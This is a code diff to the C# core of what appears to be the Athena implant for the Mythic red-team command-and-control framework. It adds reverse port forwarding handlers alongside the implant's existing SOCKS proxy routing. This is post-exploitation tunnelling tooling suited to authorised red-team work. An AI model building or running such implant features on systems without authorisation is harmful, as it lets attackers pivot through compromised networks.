@@ -1,10 +1,9 @@
 using Athena.Commands;
-using Athena.Commands.Model;
+using Athena.Models.Comms.SMB;
 using Athena.Models;
-using Athena.Models.Athena.Commands;
+using Athena.Models.Commands;
 using Athena.Models.Mythic.Checkin;
 using Athena.Models.Mythic.Tasks;
-using Athena.Models.Mythic.Response;
 using Athena.Utilities;
 using Athena.Models.Config;
 using System;
@@ -16,6 +15,9 @@ using System.Reflection;
 using System.Text;
 using System.Threading.Tasks;
 using Athena.Handler.Common;
+using Athena.Handler.Proxy;
+using Athena.Models.Proxy;
+using Athena.Models.Responses;
 
 namespace Athena
 {
@@ -24,6 +26,7 @@ namespace Athena
         public IProfile profile { get; set; }
         public CommandHandler commandHandler { get; set; }
         public SocksHandler socksHandler { get; set; }
+        public RPortFwdHandler rportfwdHandler { get; set; }
         public ForwarderHandler forwarderHandler { get; set; }
         public bool exit { get; set; }
         List<IProfile> availableProfiles { get; set; }
@@ -33,17 +36,79 @@ namespace Athena
             this.availableProfiles = GetProfiles();
             this.profile = SelectProfile(0);
             this.socksHandler = new SocksHandler();
+            this.rportfwdHandler = new RPortFwdHandler();
             this.commandHandler = new CommandHandler();
             this.forwarderHandler = new ForwarderHandler();
             this.commandHandler.SetSleepAndJitter += SetSleepAndJitter;
             this.commandHandler.StartForwarder += StartForwarder;
             this.commandHandler.StopForwarder += StopForwarder;
-            //this.commandHandler.StartSocks += StartSocks;
-            //this.commandHandler.StopSocks += StopSocks;
             this.commandHandler.ExitRequested += ExitRequested;
             this.commandHandler.SetProfile += SetProfile;
             this.commandHandler.ListForwarders += ListForwarders;
             this.commandHandler.ListProfiles += ListProfiles;
+            this.commandHandler.StartRportFwd += StartRportFwd;
+            this.commandHandler.StopRportFwd += StopRportFwd;
+        }
+
+        private void StopRportFwd(object sender, TaskEventArgs e)
+        {
+            var dict = Misc.ConvertJsonStringToDict(e.job.task.parameters);
+            if (this.rportfwdHandler.StopListener(int.Parse(dict["lport"])).Result)
+            {
+                TaskResponseHandler.AddResponse(new ResponseResult()
+                {
+                    task_id = e.job.task.id,
+                    completed = true,
+                    process_response = new Dictionary<string, string>()
+                    {
+                        { "message", "0x39" }
+                    }
+
+                });
+                return;
+            }
+
+            TaskResponseHandler.AddResponse(new ResponseResult()
+            {
+                task_id = e.job.task.id,
+                completed = true,
+                process_response = new Dictionary<string, string>()
+                    {
+                        { "message", "0x40" }
+                    },
+                status = "error"
+
+            });
+        }
+
+        private void StartRportFwd(object sender, TaskEventArgs e)
+        {
+            if (this.rportfwdHandler.StartListener(e.job).Result)
+            {
+                TaskResponseHandler.AddResponse(new ResponseResult()
+                {
+                    task_id = e.job.task.id,
+                    completed = true,
+                    process_response = new Dictionary<string, string>()
+                    {
+                        { "message", "0x41" }
+                    }
+
+                });
+                return;
+            }
+            TaskResponseHandler.AddResponse(new ResponseResult()
+            {
+                task_id = e.job.task.id,
+                completed = true,
+                process_response = new Dictionary<string, string>()
+                    {
+                        { "message", "0x42" }
+                    },
+                status = "error"
+
+            });
+
         }
 
         /// <summary>
@@ -176,6 +241,20 @@ profiles.Add("Athena.Profiles.SMB");
                 {
                     Debug.WriteLine($"[{DateTime.Now}] Handling {args.tasking_response.socks.Count} socks messages.");
                     HandleSocks(args.tasking_response.socks);
+                }
+                catch (Exception e)
+                {
+                    Debug.WriteLine(e.ToString());
+
+                }
+            }
+            
+            if (args.tasking_response.rpfwd is not null)
+            {
+                try
+                {
+                    Debug.WriteLine($"[{DateTime.Now}] Handling {args.tasking_response.rpfwd.Count} socks messages.");
+                    HandleRpFwd(args.tasking_response.rpfwd);
                 }
                 catch (Exception e)
                 {
@@ -372,62 +451,6 @@ profiles.Add("Athena.Profiles.SMB");
         }
 
         /// <summary>
-        /// EventHandler to update the Sleep and Jitter
-        /// </summary>
-        /// <param name="sender">Event Sender</param>
-        /// <param name="e">TaskEventArgs containing the MythicJob object</param>
-        //private void StartSocks(object sender, TaskEventArgs e)
-        //{
-            //if (this.socksHandler.Start().Result)
-            //{
-            //    TaskResponseHandler.AddResponse(new ResponseResult
-            //    {
-            //        process_response = new Dictionary<string, string> { { "message", "0x05" } },
-            //        //user_output = "0x05",
-            //        completed = true,
-            //        task_id = e.job.task.id,
-            //    }.ToJson());
-            //}
-            //else
-            //{
-            //    TaskResponseHandler.AddResponse(new ResponseResult
-            //    {
-            //        process_response = new Dictionary<string, string> { { "message", "0x06" } },
-            //        //user_output = "0x06",
-            //        completed = true,
-            //        task_id = e.job.task.id,
-            //        status = "error"
-            //    }.ToJson());
-            //}
-        //}
-        /// <summary>
-        /// EventHandler to starts socks forwarder
-        /// </summary>
-        /// <param name="sender">Event Sender</param>
-        /// <param name="e">TaskEventArgs containing the MythicJob object</param>
-        //private void StopSocks(object sender, TaskEventArgs e)
-        //{
-            //if (this.socksHandler.Stop().Result)
-            //{
-            //    TaskResponseHandler.AddResponse(new ResponseResult
-            //    {
-            //        process_response = new Dictionary<string, string> { { "message", "0x09" } },
-            //        completed = true,
-            //        task_id = e.job.task.id,
-            //    }.ToJson());
-            //}
-            //else
-            //{
-            //    TaskResponseHandler.AddResponse(new ResponseResult
-            //    {
-            //        process_response = new Dictionary<string, string> { { "message", "0x08" } },
-            //        completed = true,
-            //        task_id = e.job.task.id,
-            //        status = "error"
-            //    }.ToJson());
-            //}
-        //}
-        /// <summary>
         /// EventHandler to stop socks forwarder
         /// </summary>
         /// <param name="sender">Event Sender</param>
@@ -449,21 +472,24 @@ profiles.Add("Athena.Profiles.SMB");
         /// Handles SOCKS messages received from the Mythic server
         /// </summary>
         /// <param name="socks">List of SocksMessages</param>
-        private async Task HandleSocks(List<SocksMessage> socks)
+        private async Task HandleSocks(List<MythicDatagram> socks)
         {
             foreach(var sm in socks)
             {
                 await this.socksHandler.HandleMessage(sm);
             }
-            //Parallel.ForEach(socks, sm =>
-            //{
-            //    Task.Run(() =>
-            //    {
-            //        this.socksHandler.HandleMessage(sm);
-            //    });
-            //});
-
             this.socksHandler.GetSocksMessages();
+        }
+
+        private async Task HandleRpFwd(List<MythicDatagram> rportfwd)
+        {
+            foreach (var sm in rportfwd)
+            {
+
+                await this.rportfwdHandler.HandleMessage(sm);
+            }
+
+            this.rportfwdHandler.GetRportFwdMessages();
         }
 
         /// <summary>
